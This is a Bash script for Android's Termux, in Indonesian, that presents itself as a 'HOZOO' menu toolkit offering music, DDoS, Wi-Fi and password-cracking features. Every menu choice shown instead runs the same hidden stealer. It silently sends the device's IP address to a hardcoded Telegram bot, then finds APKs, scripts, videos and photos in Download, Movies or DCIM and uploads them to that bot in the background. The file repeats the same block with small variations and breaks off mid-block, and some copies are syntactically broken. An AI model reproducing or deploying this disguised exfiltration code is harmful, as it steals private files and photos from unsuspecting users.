 $e " $u ║ $k [07] $h . MENU LAGU PHONK                         $u ║ $k [17] $h . MENU WIFI MATIKAN  SEMUA PERANGKAT         $u ║"
 $e " $u ║ $k [08] $h . MENU NOVNC DOCKER SHELL CLOUND          $u ║ $k [18] $h . MENU DONASI HOZOO                          $u ║"
 $e " $u ║ $k [09] $h . MENU DDOS                               $u ║ $k [19] $h . MENU LAPOR BUG HOZOO                       $u ║"
 $e " $u ║ $k [10] $h . MENU MEMBUKA PW ZIP APK DLL             $u ║ $k [20] $h . MENU FOLLOW TIKTOK HOZOO                   $u ║"
 $e " $u ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 $e " $u ║"
 $e " $u ║"
 $e " $u ║"
read -p "  ╚═HOZOO@ROOT═══════════=>" input
if [ $input = 1 ]
then
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)
clear
# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown

clear
cd $home
fi
if [ $input = 2 ]
then
clear
#!/bin/bash

# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home

fi
if [ $input = 3 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown

cd $home
fi
if [ $input = 4 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 5 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 6 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Movies"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 7 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/DCIM/Camera
ip_address=$(curl -s ifconfig.me)


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 8 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/DCIM"
ip_address=$(curl -s ifconfig.me)

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 9 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 10 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 11 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 12 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 13 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 14 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 15 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
